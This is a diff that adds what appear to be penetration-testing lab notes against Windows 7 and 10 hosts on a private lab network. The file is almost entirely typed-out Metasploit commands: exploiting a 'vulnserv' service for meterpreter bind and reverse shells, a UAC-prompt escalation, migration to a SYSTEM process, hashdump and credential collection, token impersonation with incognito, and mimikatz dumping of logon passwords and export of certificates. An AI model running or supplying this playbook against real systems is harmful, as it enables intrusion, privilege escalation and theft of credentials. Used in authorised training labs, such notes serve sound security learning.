@@ -1,0 +1,105 @@
+Windows 10
+----------
+use exploit/windows/misc/vulnserv
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST 192.168.195.143
+set RPORT 9999
+exploit
+
+
+
+Windows 7
+---------
+use exploit/windows/misc/vulnserv
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST 192.168.195.141
+set RPORT 9999
+exploit
+background
+
+
+
+use exploit/windows/local/ask
+set SESSION 8
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.195.143                                           
+set LPORT 7799
+exploit
+
+
+
+-----------------------------------------------------------------------
+ 
+ 
+    A window will pop up and you need to click Yes in order to get your new meterpreter shell
+ 
+ 
+meterpreter > getuid
+ 
+meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
+ 
+meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
+ 
+meterpreter > getsystem
+...got system (via technique 1).
+ 
+ 
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+ 
+ 
+meterpreter> run post/windows/gather/hashdump
+ 
+meterpreter> run post/windows/gather/credentials/credential_collector
+-----------------------------------------------------------------------
+ 
+ 
+********************************** Steal Tokens **********************************
+ 
+---------------------------Type This-----------------------------------
+meterpreter > getsystem
+ 
+meterpreter > use incognito
+ 
+meterpreter > list_tokens -u
+ 
+meterpreter > list_tokens -g
+ 
+meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
+ 
+meterpreter> getuid
+-----------------------------------------------------------------------
+ 
+ 
+************ Stealing credentials and certificates ************
+- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
+ 
+---------------------------Type This-----------------------------------
+meterpreter > getsystem
+ 
+meterpreter > load mimikatz
+ 
+meterpreter > kerberos
+ 
+meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
+ 
+meterpreter > msv                                                               <-- Your AD password
+ 
+meterpreter > livessp                                                           <-- Your Windows8 password
+ 
+meterpreter > ssp                                                               <-- Your outlook password
+ 
+meterpreter > tspkg                                                             <-- Your AD password
+ 
+meterpreter > wdigest                                                           <-- Your AD password
+ 
+meterpreter > mimikatz_command -f crypto::listStores
+ 
+meterpreter > mimikatz_command -f crypto::listCertificates
+ 
+meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
+ 
+meterpreter > mimikatz_command -f crypto::patchcapi
+ 
+meterpreter> search -d <directory> -f <file-pattern>
+-----------------------------------------------------------------------
